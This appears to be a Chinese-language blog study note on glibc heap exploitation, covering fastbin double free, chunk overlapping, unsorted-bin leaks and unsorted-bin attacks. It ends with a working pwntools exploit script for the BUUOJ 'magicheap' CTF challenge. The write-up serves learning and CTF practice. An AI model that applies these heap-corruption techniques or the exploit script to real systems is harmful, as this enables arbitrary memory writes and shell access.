<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Keep">
    <meta name="description" content="Hexo Theme Keep">
    <meta name="author" content="zach0ry">
    
    <title>
        
            fast_bin |
        
        b1nary
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    
        <link rel="shortcut icon" href="/images/fire.svg">
    
    
<link rel="stylesheet" href="/font/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/font/css/regular.min.css">

    
<link rel="stylesheet" href="/font/css/solid.min.css">

    
<link rel="stylesheet" href="/font/css/brands.min.css">

    
    <script class="keep-theme-configurations">
    const KEEP = window.KEEP || {}
    KEEP.hexo_config = {"hostname":"example.com","root":"/","language":"en","path":"search.json"}
    KEEP.theme_config = {"base_info":{"primary_color":"#0066cc","title":"b1nary","author":"zach0ry","avatar":"/images/author.jpg","logo":"/images/fire.svg","favicon":"/images/fire.svg"},"menu":{"home":"/                        || fa-solid fa-home","archives":"/archives            || fa-solid fa-box-archive","tags":"/tags                  || fa-solid fa-tags","categories":"/categories      || fa-solid fa-layer-group"},"first_screen":{"enable":true,"background_img":"/images/bg.svg","background_img_dark":"/images/bg.svg","description":"Keep writing and Keep loving.","hitokoto":true},"social_contact":{"enable":false,"links":{"github":null,"weixin":null,"qq":null,"weibo":null,"zhihu":null,"twitter":null,"x":null,"facebook":null,"email":null}},"scroll":{"progress_bar":false,"percent":true,"hide_header":true},"home":{"announcement":null,"category":true,"tag":true,"post_datetime":"created"},"post":{"author_badge":null,"enable":true,"level_badge":true,"custom_badge":["炼气","筑基","结丹","元婴","化神","渡劫","大乘"],"word_count":{"wordcount":false,"min2read":false},"datetime_format":"YYYY-MM-DD","copyright_info":false,"share":true,"reward":{"enable":false,"img_link":null,"text":null,"icon":null}},"code_block":{"tools":{"enable":true,"style":"default"},"highlight_theme":"obsidian"},"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true,"layout":"right"},"website_count":{"busuanzi_count":{"enable":true,"site_uv":false,"site_pv":false,"page_pv":false}},"local_search":{"enable":true,"preload":true},"search":{"path":"search.json","field":"post","content":true,"format":"striptags"},"comment":{"enable":false,"use":"valine","valine":{"appid":null,"appkey":null,"server_urls":null,"placeholder":null},"gitalk":{"github_id":null,"github_admins":null,"repository":null,"client_id":null,"client_secret":null,"proxy":null},"twikoo":{"env_id":null,"region":null,"version":"1.6.39"},"waline":{"server_url":null,"reaction":false,"version":"3.3.2"},"giscus":{"repo":null,"repo_id":null,"category":"Announcements","category_id":null,"reactions_enabled":false},"artalk":{"server":null},"disqus":{"shortname":null}},"rss":{"enable":false},"lazyload":{"enable":false},"cdn":{"enable":false,"provider":"cdnjs"},"pjax":{"enable":false},"footer":{"since":2020,"word_count":false,"site_deploy":{"enable":false,"provider":"github","url":null},"record":{"enable":false,"list":[{"code":null,"link":null}]}},"inject":{"enable":false,"css":[null],"js":[null]},"root":"","source_data":{},"version":"4.2.5"}
    KEEP.language_ago = {"second":"%s seconds ago","minute":"%s minutes ago","hour":"%s hours ago","day":"%s days ago","week":"%s weeks ago","month":"%s months ago","year":"%s years ago"}
    KEEP.language_code_block = {"copy":"Copy code","copied":"Copied","fold":"Fold code block","folded":"Folded"}
    KEEP.language_copy_copyright = {"copy":"Copy copyright info","copied":"Copied","title":"Original post title","author":"Original post author","link":"Original post link"}
  </script>
<meta name="generator" content="Hexo 7.3.0"></head>


<body>
<div class="progress-bar-container">
    

    
</div>



<main class="page-container border-box">
    <!-- home first screen  -->
    

    <!-- page content -->
    <div class="page-main-content border-box">
        <div class="page-main-content-top">
            
<header class="header-wrapper">

    <div class="border-box header-content">
        <div class="left flex-start border-box">
            
                <a class="logo-image border-box" href="/">
                    <img src="/images/fire.svg">
                </a>
            
            <a class="site-name border-box" href="/">
               b1nary
            </a>
        </div>

        <div class="right border-box">
            <div class="pc border-box">
                <ul class="menu-list border-box">
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-home"></i>
                                
                                HOME
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/archives">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-box-archive"></i>
                                
                                ARCHIVES
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/tags">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-tags"></i>
                                
                                TAGS
                                
                            </a>
                            
                        </li>
                    
                        
                        <li class="menu-item flex-start border-box">
                            <a class="menu-text-color border-box" href="/categories">
                                
                                    <i class="menu-text-color menu-icon fa-solid fa-layer-group"></i>
                                
                                CATEGORIES
                                
                            </a>
                            
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="menu-text-color fas search fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile border-box flex-start">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list border-box">
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-home"></i>
                                </span>
                            
                            HOME
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/archives">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-box-archive"></i>
                                </span>
                            
                            ARCHIVES
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/tags">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-tags"></i>
                                </span>
                            
                            TAGS
                        </a>
                        
                    </label>
                    
                </li>
            
                
                <li class="drawer-menu-item border-box not-sub-menu">
                    <label class="drawer-menu-label border-box">
                        <a class="drawer-menu-text-color left-side flex-start border-box" href="/categories">
                            
                                <span class="menu-icon-wrap border-box flex-center">
                                    <i class="drawer-menu-text-color menu-icon fa-solid fa-layer-group"></i>
                                </span>
                            
                            CATEGORIES
                        </a>
                        
                    </label>
                    
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle border-box">

            <div class="main-content border-box">
                

                    
<div class="fade-in-down-animation">
    <div class="post-page-container border-box">
        <div class="post-content-container border-box">
            

            <div class="post-content-bottom border-box">
                
                    <div class="post-title">
                        fast_bin
                    </div>
                

                
                    <div class="post-header border-box">
                        
                            <div class="avatar-box border-box">
                                <img src="/images/author.jpg">
                            </div>
                        
                        <div class="info-box">
                            <div class="author border-box">
                                <span class="name">zach0ry</span>
                                
                            </div>
                            <div class="meta-info border-box">
                                

<div class="post-meta-info-container border-box post">
    <div class="post-meta-info border-box">
        

        
            <span class="meta-info-item post-create-date">
                <i class="icon fa-solid fa-calendar-plus"></i>&nbsp;
                <span class="datetime">2025-10-01</span>
            </span>

            
                <span class="meta-info-item post-update-date">
                    <i class="icon fa-solid fa-file-pen"></i>&nbsp;
                    <span class="datetime" data-updated="Thu Oct 09 2025 12:12:01 GMT+0800">2025-10-09</span>
                </span>
            
        

        
            <span class="meta-info-item post-category border-box"><i class="icon fas fa-folder"></i>&nbsp;
                <ul class="post-category-ul">
                    
                            <li class="category-item"><a href="/categories/heap-study/">heap_study</a></li>
                        
                    
                </ul>
            </span>
        

        
            <span class="post-tag meta-info-item border-box">
                <ul class="post-tag-ul">
                    
                            <li class="tag-item"><span class="tag-separator"><i class="icon fas fa-hashtag"></i></span><a href="/tags/heap/">heap</a></li>
                        
                    
                </ul>
            </span>
        

        
        
        
        
    </div>

    
</div>

                            </div>
                        </div>
                    </div>
                

                <div class="post-content keep-markdown-body ">
                    

                    
                         <p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251001133928671.png"  alt="image-20251001133928671"></p>
<p>0x555555559000: 0x0000000000000000   ← prev_size（上一个 chunk 大小；此处用不到）<br>0x555555559008: 0x0000000000000021   ← size &#x3D; 0x20 | PREV_INUSE<br>0x555555559010: 0x0000555555559020   ← 用户区前 8 字节 &#x3D; fastbin fd（指向下一结点）<br>0x555555559018: 0x0000000000000000   ← 用户区其余数据（此刻为 0）</p>
<h1 id="double-free"><a href="#double-free" class="headerlink" title="double_free"></a>double_free</h1><p>申请三块同尺寸：<code>A, B, C</code>。</p>
<p><code>free(A)</code>；<code>free(B)</code>；绕过“top-of-bin”检查后再 <code>free(A)</code>（现在链表出现两个 <code>A</code> 的引用，等价于“把 A 放了两次”）。</p>
<p>下一次 <code>malloc</code> 取回 <code>A</code> 后，你可以改写这个块中的 <code>fd</code> 字段，让它指向“目标地址附近（满足对齐且减去头大小后的地址）”。</p>
<p>连续再 <code>malloc</code> 数次：先吃掉链表中的“假结点”，最终得到一个指向目标地址的伪 chunk，实现“任意地址附近获得可写块”→ 再写敏感指针（如函数指针、vtable、hook）。</p>
<p><strong>也就是说可以通过改变一个，然后调用这个使用改变的</strong></p>
<h2 id="fastbin-dup-into-stack"><a href="#fastbin-dup-into-stack" class="headerlink" title="fastbin_dup_into_stack"></a>fastbin_dup_into_stack</h2><p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251001132728900.png"  alt="image-20251001132728900"></p>
<ol>
<li>申请三块同尺寸（请求 8 字节，实际对齐到 <code>0x20</code> 类别）：得到用户指针 <code>a,b,c</code>。</li>
<li><code>free(a)</code> → fastbin 链变成 <code>[A]</code>（A 的 <strong>fd</strong> 写在 <code>a</code> 指向的 8 字节处）。</li>
<li><code>free(b)</code> → 链为 <code>[B, A]</code>。</li>
<li>再 <code>free(a)</code>（此时 A 不在链表头）→ 链为 <code>[A, B, A]</code>，这就是 <strong>dup</strong>（同一物理块 A 出现两次）。</li>
</ol>
<p>此时从 fastbin 弹两次：</p>
<ol>
<li><code>d = malloc(8)</code>：拿到<strong>链表头 A 的用户指针</strong>，所以 <code>d == a</code>。</li>
<li><code>malloc(8)</code>：拿到 B。<br> 链里只剩下一个 A：<code>[A]</code>。</li>
</ol>
<p>重点：你<strong>手里还拿着</strong> <code>d=a</code> 这根指针，它指向 A 的<strong>用户区</strong>开头，也就是<strong>fastbin 的 fd 所在处</strong>。<br> 所以你写 <code>*d = ...</code>，实际上就是在<strong>改 A 的 fd</strong>！</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251001134958095.png"  alt="image-20251001134958095"></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251001134946687.png"  alt="image-20251001134946687"></p>
<p>可以看到（malloc）返回的指针是user的内存空间地址，且fd处存入的指针也是pre_size字段的地址</p>
<blockquote>
<p>记住：**fastbin 的 fd 就是“被 free 的 chunk 的用户区前 8 字节”。**因为 <code>d</code> 指向用户区首地址，<code>*d</code> 就改了 fd。</p>
</blockquote>
<p>然后向栈 (stack) 写入一个伪造的空闲块大小（在本例中为 0x20），以便 malloc 会认为那里有一个空闲块并同意</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">stack_var = 0x20;#伪造栈大小</span><br><span class="line">*d = (unsigned long long)(((char*)&amp;stack_var) - sizeof(d));</span><br><span class="line">//这个d就是fd指针处，((char*)&amp;stack_var)是写入0x20的栈的位置，相当于size字段，所以这个伪块的头地址是pre_size字段，所以取其减8的地址处</span><br></pre></td></tr></table></figure>

<h2 id="fastbin-dup-consolidate"><a href="#fastbin-dup-consolidate" class="headerlink" title="fastbin_dup_consolidate"></a>fastbin_dup_consolidate</h2><p>利用 malloc_consolidate + 一次历史小块的 double-free，拿到同一大块的两份引用（UAF&#x2F;dup）”</p>
<p>先把一个小 fastbin 块 free 到 bins 里——&gt; 触发 consolidate 把它并进 top， 紧接着从 top 切一块大块回来，起始地址正好等于当年的小块地址。此时你手里旧指针 p1 和新分配的大块 p3 地址相等；再对 p1 做一次 free，就把“仍在用的 p3”给 free 掉，制造出 UAF；接着再 malloc 一次同尺寸，得到 p4 &#x3D;&#x3D; p3，实现<strong>一块内存被两个活跃变量共享</strong>的“duplication”</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">void* p1 = calloc(1,0x40)</span><br><span class="line">free(p1)#会被合并到top chunk</span><br><span class="line">void* p3 = malloc(0x400)#指针位置和p1相同</span><br><span class="line">free(p1)#相当于释放的p3</span><br><span class="line">void *p4 = malloc(0x400);#p3 p4的指针相同</span><br></pre></td></tr></table></figure>

<h1 id="overlapping-chunks"><a href="#overlapping-chunks" class="headerlink" title="overlapping_chunks"></a>overlapping_chunks</h1><h2 id="size-change"><a href="#size-change" class="headerlink" title="size_change"></a>size_change</h2><p>通过篡改已释放块的 size**，让下一次 malloc 从 unsorted bin 里按你伪造的大小切块，结果新块 p4 的范围与现存块 p3 发生物理重叠。有了重叠，就能做到“写 p4 → 改到 p3，或写 p3 → 改到 p4”，形成强力的越界读写能力。</p>
<p>当p2被释放之后，由于前一个空闲的，所以p3的pre_size位会记录其大小0x100</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251001200341455.png"  alt="image-20251001200341455"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(p2-1) = evil_chunk_size;</span><br></pre></td></tr></table></figure>

<p>修改之后会覆盖p3</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251001200405387.png"  alt="image-20251001200405387"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p4 = malloc(evil_region_size);#就会把p2连着p3一起malloc</span><br></pre></td></tr></table></figure>

<p>此时就可以通过p3或p4处理对方了</p>
<h2 id="pre-size-change"><a href="#pre-size-change" class="headerlink" title="pre_size change"></a>pre_size change</h2><p>通过溢出修改 p2 的 size**，骗过 free(p2) 的“向前&#x2F;向后合并（coalesce）”逻辑，让分配器把p3 当成 p2 的一部分跳过去，直接把 p2 与更远处已空闲的 p4 合并成一个“大空闲块”。随后一次 malloc 从这个“大块”里切出 p6，p6 的范围就会覆盖&#x2F;重叠到原本在用的 p3。这样你用 p6 的“合法写”就能改 p3 的数据</p>
<p>malloc_usable_size返回的是size之后该堆块可以填充字节的数</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251001213326906.png"  alt="n"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">  p1 = malloc(1000);</span><br><span class="line">  p2 = malloc(1000);</span><br><span class="line">  p3 = malloc(1000);</span><br><span class="line">  p4 = malloc(1000);</span><br><span class="line">  p5 = malloc(1000);</span><br><span class="line"></span><br><span class="line">  real_size_p1 = malloc_usable_size(p1);</span><br><span class="line">  real_size_p2 = malloc_usable_size(p2);</span><br><span class="line">  real_size_p3 = malloc_usable_size(p3);</span><br><span class="line">  real_size_p4 = malloc_usable_size(p4);</span><br><span class="line">  real_size_p5 = malloc_usable_size(p5);</span><br><span class="line"></span><br><span class="line">  free(p4);</span><br><span class="line"></span><br><span class="line">  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //&lt;--- BUG HERE </span><br><span class="line">#前一个堆块在使用，p2没有pre_size位，所以p1的use位置直接加p1的填充数就到了篇的size位置</span><br><span class="line">#把p2的可填充位置改为覆盖p2和p3,即包含p2和p3的原始填充范围和一个头sizeof(size_t) * 2以及prev_in_use表示上一个在使用中</span><br><span class="line"></span><br><span class="line">  free(p2);</span><br><span class="line">  p6 = malloc(2000);</span><br></pre></td></tr></table></figure>

<p><strong>为什么“要和 p4 合并”才稳</strong></p>
<ul>
<li><code>free(p2)</code> 时，分配器计算 <code>nextchunk = p2 + size(p2)</code>。<br> 你把 <code>size(p2)</code>伪造成“p2+p3 的总大小”，于是 <code>nextchunk</code> <strong>刚好指到 p4 的头</strong>。</li>
<li>接着它看 <code>nextchunk</code> 是否空闲：<ul>
<li><strong>若 p4 是空闲</strong> → 触发<strong>前向合并</strong>：把 p2 和 p4 拼成一整块“大空闲块”。<strong>整个过程不会去动 p3 的头</strong>，因此不会触发对 p3 的一致性检查，<strong>稳</strong>。</li>
<li><strong>若 p4 在用</strong> → 不合并。此时你伪造的“超大 p2”<strong>伸进了正在使用的 p3</strong>，但 <code>free(p2)</code> 又不能和 p3 合并，下一步 allocator 可能会在处理 <code>nextchunk</code> 相关字段时（比如写合并后的 <code>prev_size</code>、检查 <code>inuse</code> 位等）撞上不一致，<strong>高概率崩</strong>。</li>
</ul>
</li>
</ul>
<blockquote>
<p>换句话说：<strong>“跨过 p3 去找 p4 并合并”</strong>，是这条攻击能在 <code>free()</code> 的一致性检查下<strong>存活</strong>的关键设计。</p>
</blockquote>
<h1 id="unsorted-bin"><a href="#unsorted-bin" class="headerlink" title="unsorted_bin"></a>unsorted_bin</h1><h2 id="unsorted-bin调配"><a href="#unsorted-bin调配" class="headerlink" title="unsorted_bin调配"></a>unsorted_bin调配</h2><p><strong>步骤 0 — malloc 分配（未 free 前）</strong></p>
<p>假设程序做了 <code>p = malloc(0x400)</code>，得到 <code>p = 0x1000</code>。内存（简化）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">地址       内容 (8 bytes)</span><br><span class="line">0x0FF0: header.size  (chunk header，在 p 之前)</span><br><span class="line">0x1000: user[0] = ???   (p[0])</span><br><span class="line">0x1008: user[1] = ???   (p[1])</span><br><span class="line">0x1010: ...</span><br></pre></td></tr></table></figure>

<p><strong>步骤 1 — free(P) ：把 P 插入 unsorted bin（glibc 写入 fd&#x2F;bk）</strong></p>
<p>当 <code>free(p)</code> 执行时（P 是大块，走 unsorted 路径）glibc 会把 P 放入 unsorted bin，并在 <strong>user area开头</strong> 写入指针：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">写入动作（由 free 完成）：</span><br><span class="line">  *(p + 0) = fd  = &amp;main_arena + off1   // 假设具体值为 0x2000</span><br><span class="line">  *(p + 1) = bk  = &amp;main_arena + off2   // 假设具体值为 0x3000</span><br></pre></td></tr></table></figure>

<p>对于刚插入 unsorted bin 的 chunk（bin 为空或插入到 bin head 时的常见情形），glibc 通常把 fd&#x2F;bk 写成指向 main_arena（或 main_arena 内某个字段）的地址 —— 简单说就是 指向 libc 内部的数据结构的地址，现在若程序能读 <code>p[0]</code> 或 <code>p[1]</code>（例如有 infoleak、printf、read），就能得到一个裸 libc 指针 —— 这就是常见的 <strong>unsorted-bin 泄露</strong>，用来计算 libc 基址。</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251008200459950.png"  alt="image-20251008200459950"></p>
<p>内存快照（free 后）：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">地址      内容（写后）</span><br><span class="line">0x1000: 0x0000000000002000   // p[0] == fd</span><br><span class="line">0x1008: 0x0000000000003000   // p[1] == bk</span><br></pre></td></tr></table></figure>



<p><strong>步骤 2 — glibc 想移除 P（malloc 请求或整理过程触发 unlink）</strong></p>
<p>当另一次 <code>malloc</code> 或整理流程需要移除 unsorted bin 中的 P 时，glibc 会读取 <code>p[0]</code>&#x2F;<code>p[1]</code>（fd &#x2F; bk），执行链表更新。核心伪代码：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">fd = p[0];   // 从 0x1000 读出 0x2000</span><br><span class="line">bk = p[1];   // 从 0x1008 读出 0x3000</span><br><span class="line"></span><br><span class="line">// 写操作：</span><br><span class="line">fd-&gt;bk = bk;   // 在 fd 指向地址 +8 处写入 bk</span><br><span class="line">bk-&gt;fd = fd;   // 在 bk 指向地址 +0 处写入 fd</span><br></pre></td></tr></table></figure>

<p>把数值代入：<code>fd = 0x2000</code>, <code>bk = 0x3000</code>。</p>
<ul>
<li><p>写操作 A (<code>fd-&gt;bk = bk</code>) 对应内存写 <code>*(0x2000 + 8) = 0x3000</code>，即写入地址 <code>0x2008</code>。</p>
</li>
<li><p>写操作 B (<code>bk-&gt;fd = fd</code>) 对应内存写 <code>*(0x3000 + 0) = 0x2000</code>，即写入地址 <code>0x3000</code>。</p>
<p>（就是说把这个单独摘出去，再通过其它的把链表接上）</p>
</li>
</ul>
<h2 id="unsorted-bin攻击"><a href="#unsorted-bin攻击" class="headerlink" title="unsorted_bin攻击"></a>unsorted_bin攻击</h2><p>通过修改bk指针调取栈上的伪造堆</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">	intptr_t* victim = malloc(0x100);</span><br><span class="line">	intptr_t* p1 = malloc(0x100);//防合并</span><br><span class="line">	free(victim);</span><br><span class="line">//伪造堆</span><br><span class="line">	stack_buffer[1] = 0x100 + 0x10;</span><br><span class="line">	stack_buffer[3] = (intptr_t)stack_buffer;</span><br><span class="line"></span><br><span class="line">//修改unsorted中的chunk，连接下一个chunk</span><br><span class="line">	victim[-1] = 32;// 修改 victim-&gt;size 为 0x20,让malloc跳过这个堆</span><br><span class="line">	victim[1] = (intptr_t)stack_buffer; // 修改 victim-&gt;bk 指向栈上的伪造 chunk</span><br><span class="line"></span><br><span class="line">	char *p2 = malloc(0x100);</span><br><span class="line">	printf(&quot;malloc(0x100): %p\n&quot;, p2);</span><br><span class="line"></span><br><span class="line">	intptr_t sc = (intptr_t)jackpot; //shellcode</span><br><span class="line">	memcpy((p2+40), &amp;sc, 8); //通过栈上的ret去获取shell</span><br></pre></td></tr></table></figure>

<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251008210751188.png"  alt="image-20251008210751188"><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251008210805560.png"  alt="image-20251008210805560"></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251008210539069.png"  alt="image-20251008210539069"></p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">victim[-1] = 32;// 修改 victim-&gt;size 为 0x20,让malloc跳过这个堆</span><br><span class="line">victim[1] = (intptr_t)stack_buffer; // 修改 victim-&gt;bk 指向栈上的伪造 chunk</span><br></pre></td></tr></table></figure>

<p>改之后</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251008210615833.png"  alt="image-20251008210615833"></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251008210654924.png"  alt="image-20251008210654924"></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251008210708334.png"  alt="image-20251008210708334"></p>
<h4 id="实操"><a href="#实操" class="headerlink" title="实操"></a>实操</h4><p><a class="link"   target="_blank" rel="noopener" href="https://buuoj.cn/challenges#hitcontraining_magicheap" >例题<i class="fas fa-external-link-alt"></i></a></p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251009120403816.png"  alt="image-20251009120403816"></p>
<p>add</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251009120419406.png"  alt="image-20251009120419406"></p>
<p>free （指针置0了，没有uaf漏洞）</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251009120447178.png"  alt="image-20251009120447178"></p>
<p>exit (可以自己控制输入，可以堆溢出)</p>
<p><img   src="https://cdn.jsdelivr.net/gh/zach0ry-zzh/Inage//test/image-20251009121147199.png"  alt="image-20251009121147199"></p>
<p>脚本</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">from pwn import*</span><br><span class="line"> </span><br><span class="line">#r = process(&#x27;./magic&#x27;)</span><br><span class="line">r =remote(&quot;node5.buuoj.cn&quot;,27415)</span><br><span class="line">#gdb.attach(r,&quot;b malloc&quot;)</span><br><span class="line">def create(size,content):</span><br><span class="line">	r.sendlineafter(&#x27;Your choice :&#x27;,&#x27;1&#x27;)</span><br><span class="line">	r.sendlineafter(&#x27;Size of Heap :&#x27;,str(size))</span><br><span class="line">	r.sendlineafter(&#x27;Content of heap:&#x27;,content)</span><br><span class="line">	</span><br><span class="line">def edit(idx,size,content):</span><br><span class="line">	r.sendlineafter(&#x27;Your choice :&#x27;,&#x27;2&#x27;)</span><br><span class="line">	r.sendlineafter(&#x27;Index :&#x27;,str(idx))</span><br><span class="line">	r.sendlineafter(&#x27;Size of Heap :&#x27;,str(size))</span><br><span class="line">	r.sendlineafter(&#x27;Content of heap :&#x27;,content)</span><br><span class="line">	</span><br><span class="line">def delete(idx):</span><br><span class="line">	r.sendlineafter(&#x27;Your choice :&#x27;,&#x27;3&#x27;)</span><br><span class="line">	r.sendlineafter(&#x27;Index :&#x27;,str(idx))</span><br><span class="line">	</span><br><span class="line">create(0x30,&#x27;aaaa&#x27;)</span><br><span class="line">create(0x80,&#x27;bbbb&#x27;)</span><br><span class="line">create(0x10,&#x27;cccc&#x27;)</span><br><span class="line"></span><br><span class="line">delete(1)</span><br><span class="line"></span><br><span class="line"> </span><br><span class="line">magic= 0x06020A0 </span><br><span class="line">pay=0x30 * b&quot;a&quot; + p64(0)+p64(0x91)+p64(0)+p64(magic-0x10)</span><br><span class="line">edit(0,0x50,pay)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">create(0x80,&#x27;dddd&#x27;)</span><br><span class="line"># gdb.attach(r)</span><br><span class="line"># pause()</span><br><span class="line"></span><br><span class="line">r.sendlineafter(&#x27;Your choice :&#x27;,&#x27;4869&#x27;)</span><br><span class="line"></span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure>




                    
                </div>

                

                <div class="post-bottom-tags-and-share border-box">
                    <div>
                        
                            <ul class="post-tags-box border-box">
                                
                                    <li class="tag-item border-box">
                                        <i class="icon fas fa-hashtag"></i>&nbsp;<a href="/tags/heap/">heap</a>
                                    </li>
                                
                            </ul>
                        
                    </div>
                    <div>
                        
                            <div class="post-share-container border-box">
    <ul class="share-list-wrap border-box">
        <li class="qq share-item border-box flex-center tooltip"
            data-tooltip-content="Share to QQ"
        >
            <i class="fa-brands fa-qq"></i>
        </li>
        <li class="wechat share-item border-box flex-center tooltip tooltip-img"
            data-tooltip-content="Share to WeChat"
            data-tooltip-img-tip="Scan by WeChat"
            data-tooltip-img-style="background-color: #fff; top: -10px; padding: 0.6rem 0.6rem 0.1rem 0.6rem;"
        >
            <i class="fa-brands fa-weixin"></i>
        </li>
